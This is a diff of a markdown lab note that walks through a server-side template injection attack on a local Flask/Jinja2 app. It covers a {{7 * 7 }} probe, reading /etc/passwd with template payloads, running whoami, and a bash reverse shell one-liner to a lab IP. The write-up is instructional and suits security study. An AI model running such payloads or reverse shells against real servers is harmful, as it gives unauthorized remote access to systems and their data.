@@ -21,33 +21,33 @@ To prevent SSTI attacks, web application developers must properly validate and f
 **Note:** SSTI = Direct attack on the server. CSTI = When it is more client-side to potentially derive it into, for example, an XSS attack and steal the user's session.
 
 #### Lab 
-![[Pasted image 20260126181323.png]]
+![Pasted image 20260126181323](/VaultSite/wiki-images/Pasted%20image%2020260126181323.png)
 
 If we run a localhost on port 8089, we will see a web page.
-![[Pasted image 20260126181511.png]]
-![[Pasted image 20260126181536.png]]
+![Pasted image 20260126181511](/VaultSite/wiki-images/Pasted%20image%2020260126181511.png)
+![Pasted image 20260126181536](/VaultSite/wiki-images/Pasted%20image%2020260126181536.png)
 
 Let's gather information about the content management systems and the web using WhatWeb or Wappalyzer.
-![[Pasted image 20260126181706.png]]
+![Pasted image 20260126181706](/VaultSite/wiki-images/Pasted%20image%2020260126181706.png)
 Whenever we see Flask or Python running behind an exposed web service, we can consider SSTI vulnerabilities.
 
 For example, if we see that we have control over the input, as in this page where what we enter in the username field is reflected back.
 
 Let's try entering `{{7 * 7 }}`. If we get 49 in the output:
-![[Pasted image 20260126182257.png]]
-![[Pasted image 20260126182313.png]]
+![Pasted image 20260126182257](/VaultSite/wiki-images/Pasted%20image%2020260126182257.png)
+![Pasted image 20260126182313](/VaultSite/wiki-images/Pasted%20image%2020260126182313.png)
 If we want to use different types of injections, we have wikis like https://github.com/swisskyrepo/PayloadsAllTheThings or https://book.hacktricks.wiki/en/index.html.
 
 In the Git repository, we have SSTI injections for Jinja2.
-![[Pasted image 20260126183307.png]]
+![Pasted image 20260126183307](/VaultSite/wiki-images/Pasted%20image%2020260126183307.png)
 We try different ones until we find the right one. For example, if we want to view `/etc/hosts`, we just need to change the part of the line from `/etc/passwd`.
-![[Pasted image 20260126183346.png]]
-![[Pasted image 20260126183440.png]]
+![Pasted image 20260126183346](/VaultSite/wiki-images/Pasted%20image%2020260126183346.png)
+![Pasted image 20260126183440](/VaultSite/wiki-images/Pasted%20image%2020260126183440.png)
 Now we can read files from the victim server, but the importance of SSTI is that we can execute commands.
-![[Pasted image 20260126183546.png]]
-![[Pasted image 20260126183621.png]]
+![Pasted image 20260126183546](/VaultSite/wiki-images/Pasted%20image%2020260126183546.png)
+![Pasted image 20260126183621](/VaultSite/wiki-images/Pasted%20image%2020260126183621.png)
 `whoami`:
-![[Pasted image 20260126183643.png]]
+![Pasted image 20260126183643](/VaultSite/wiki-images/Pasted%20image%2020260126183643.png)
 And if we wanted to gain access to the machine, we would need to listen with netcat on port 443 and change the command to a reverse shell: `bash -i >& /dev/tcp/10.10.11.92/443 0>&1` (if we get an error, it will be due to the ampersand `&`, which needs to be URL encoded).
-![[Pasted image 20260126183804.png]]
-![[Pasted image 20260126184033.png]]
+![Pasted image 20260126183804](/VaultSite/wiki-images/Pasted%20image%2020260126183804.png)
+![Pasted image 20260126184033](/VaultSite/wiki-images/Pasted%20image%2020260126184033.png)
